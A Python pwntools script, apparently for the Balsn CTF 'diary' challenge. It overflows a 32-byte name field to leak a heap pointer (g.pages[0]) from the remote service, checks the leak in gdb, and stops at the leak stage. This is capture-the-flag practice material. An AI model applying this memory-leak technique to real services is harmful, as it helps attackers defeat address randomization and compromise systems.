#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        # Check this out xD
        # https://github.com/Gallopsled/pwntools/pull/1695
        return gdb.debug(['share/diary.dbg'], api=True)
    else:
        return remote('diary.balsnctf.com', 10101)


def main():
    with connect() as tube:
        tube.gdb.continue_nowait()

        tube.recvuntil(b'What\'s your name : ')
        name = b'A' * 32
        tube.send(name)

        tube.recvuntil(b'choice : ')
        tube.sendline(b'2')  # Write Diary
        tube.recvuntil(b'Diary Length : ')
        tube.sendline(b'1')
        tube.recvuntil(b'Diary Content : ')
        tube.send(b'A')

        tube.recvuntil(b'choice : ')
        tube.sendline(b'1')  # Show Name
        tube.recvuntil(name)
        leak_suffix = b'\n===================='
        leak = tube.recvuntil(leak_suffix)
        page0, = struct.unpack(
            '<Q', leak[:-len(leak_suffix)].ljust(8, b'\0'))
        print(f'g.pages[0] = 0x{page0:x}')

        tube.gdb.interrupt_and_wait()
        gdb_page0 = tube.gdb.parse_and_eval('g.pages[0]') \
            .cast(tube.gdb.lookup_type('long'))
        tube.gdb.continue_nowait()
        assert page0 == gdb_page0

        tube.interactive()


if __name__ == '__main__':
    main()
